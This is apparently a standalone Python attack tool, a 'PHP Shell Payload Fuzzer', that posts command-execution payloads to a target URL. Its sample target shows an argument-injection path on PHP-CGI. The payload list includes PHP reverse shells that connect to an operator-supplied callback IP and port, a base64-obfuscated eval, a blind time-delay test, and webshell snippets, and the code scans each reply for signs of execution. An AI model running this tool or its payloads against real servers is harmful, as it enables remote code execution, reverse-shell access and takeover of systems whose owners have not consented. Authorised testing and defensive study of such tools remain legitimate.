#!/usr/bin/env python3

import requests
import time
import argparse
from urllib.parse import urlparse


DEFAULT_PAYLOADS = [
    # Simple command tests
    "whoami",
    "id",
    'php -r \'system("id");\'',
    'php -r \'exec("uname -a");\'',

    # Reverse shells (replace CALLBACK_IP and CALLBACK_PORT)
    'php -r \'$s=fsockopen("CALLBACK_IP",CALLBACK_PORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'php -r \'$s=fsockopen("CALLBACK_IP",CALLBACK_PORT);proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$pipes);\'',

    # Encoded/obfuscated commands
    'php -r \'eval(base64_decode("c3lzdGVtKCd3aG9hbWknKTs="));\'',

    # Time delay test (for blind RCE)
    'php -r \'sleep(5); echo "sleep test complete";\'',

    # Webshell-style payloads
    '<?php system($_GET["x"]); ?>',
    '<?php echo shell_exec("id"); ?>'
]


def send_payload(target_url, payload, callback_ip, callback_port, timeout=8):
    """Send a single payload and evaluate the response."""
    substituted_payload = payload.replace("CALLBACK_IP", callback_ip).replace("CALLBACK_PORT", str(callback_port))

    print(f"[>] Sending payload: {substituted_payload[:80]}...")

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        start_time = time.time()
        response = requests.post(target_url, headers=headers, data=substituted_payload, timeout=timeout)
        elapsed_time = time.time() - start_time

        print(f"[+] HTTP Status: {response.status_code} | Response Time: {elapsed_time:.2f} seconds")

        if any(keyword in response.text.lower() for keyword in ["uid=", "www-data", "linux", "root"]):
            print("[+] Potential RCE indicator found in response.")
            print(response.text.strip()[:300])

        elif elapsed_time >= 5:
            print("[+] Delayed response detected; possible time-based execution.")

        elif response.status_code >= 500:
            print("[+] Server error; the payload may have partially executed.")

    except requests.exceptions.ReadTimeout:
        print("[!] Request timed out. The payload may have caused a blocking operation.")

    except requests.RequestException as error:
        print(f"[!] Request failed: {error}")

    print("-" * 80)


def run_fuzzer(target_url, callback_ip, callback_port, payloads):
    """Run the full fuzzing process."""
    for payload in payloads:
        send_payload(target_url, payload, callback_ip, callback_port)


def parse_args():
    parser = argparse.ArgumentParser(
        description="PHP Shell Payload Fuzzer - Tests various command and reverse shell payloads."
    )
    parser.add_argument(
        "-t", "--target", required=True,
        help="Target URL (e.g., http://host/cgi-bin/php-cgi?%%ADd+auto_prepend_file=php://input)"
    )
    parser.add_argument(
        "-c", "--callback-ip", default="127.0.0.1",
        help="Your IP for reverse shell callbacks"
    )
    parser.add_argument(
        "-p", "--callback-port", default=4444, type=int,
        help="Port for reverse shell callbacks"
    )
    parser.add_argument(
        "--payload-file", help="Optional file containing additional payloads to fuzz"
    )
    return parser.parse_args()


def load_payloads(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to load payloads from {file_path}: {e}")
        return []


def main():
    args = parse_args()

    print("=" * 80)
    print(" PHP Shell Payload Fuzzer")
    print(" Target:", args.target)
    print(" Callback:", f"{args.callback_ip}:{args.callback_port}")
    print("=" * 80)

    payloads = DEFAULT_PAYLOADS
    if args.payload_file:
        custom_payloads = load_payloads(args.payload_file)
        if custom_payloads:
            payloads = custom_payloads

    run_fuzzer(args.target, args.callback_ip, args.callback_port, payloads)


if __name__ == "__main__":
    main()
